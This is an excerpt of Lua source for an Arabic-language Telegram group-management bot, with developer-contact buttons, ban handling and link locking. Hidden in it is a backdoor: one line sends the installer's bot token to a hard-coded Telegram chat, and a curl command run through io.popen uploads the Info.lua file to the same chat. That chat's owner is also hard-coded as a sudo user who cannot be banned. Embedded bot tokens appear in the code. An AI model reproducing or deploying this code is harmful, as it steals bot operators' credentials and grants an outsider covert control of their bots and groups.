...
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1911791090&text=' ..token)
end 
else
...
sudo_users = {SUDO,1932226438,1914852231,1911791090,1936865600}   
...
var = true
elseif tonumber(user_id) == tonumber(1911791090) then
var = true
elseif tonumber(user_id) == tonumber(1936865600) then
var = true
...
{
{text = 'ضيفني فرومك 🙈♥️' ,url="t.me/"..dofile("./TOKYO.lua").botUserName.."?startgroup=start"}, 
},
}
...
if text == 'عرابي' or text == 'عورابي' or text == 'مطور السورس' then
local Text = [[
◍ مطور السورس
...
if text == 'احمد' or text == 'غنيم' or text == 'غونيم' then
local Text = [[
◍ مطور السورس
◍ يمكنك التواصل معه عن طريق معرفه
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمطـور غـنـيـم',url="t.me/U_F_G"}},
{{text = 'ضيفني فرومك 🙈♥️' ,url="t.me/"..dofile("./TOKYO.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمطـور عـرابـۍۧ',url="t.me/DEV_ORABI"},{text = 'الـمطـور غـنـيـم',url="t.me/U_F_G"}},
...
if tonumber(result.sender_user_id_) == tonumber(1936865600) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ◍ ")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1911791090) then  
...
if result.id_ == tonumber(1936865600) then
send(msg.chat_id_, msg.id_, " ◍ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if result.id_ == tonumber(1911791090) then
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر  \n")
return false 
end
usertext = '\n ◍ العضو ← ['..result.title_..'](t.me/'..(username or 'Source_T7')..')'
...
if tonumber(userid) == tonumber(1936865600) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ◍ ")
return false 
end
...
if tonumber(userid) == tonumber(1911791090) then  
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر ")
return false 
end
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 1911791090 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
